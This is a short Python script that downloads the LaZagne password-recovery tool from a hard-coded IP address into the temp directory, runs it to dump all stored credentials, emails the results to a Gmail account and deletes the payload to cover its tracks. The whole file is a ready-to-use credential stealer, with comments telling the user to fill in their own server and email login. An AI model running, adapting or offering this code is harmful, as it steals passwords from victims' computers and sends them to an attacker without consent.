#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    print(file_name)
    with open(file_name, "wb") as out_file:
        out_file.write(get_request.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.0.0.137/lazagne.exe") # URL to your server hosting lazagne.exe
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("your-email@example.com","email_password", result) # Add your email creds here
os.remove("lazagne.exe") # removes the payload
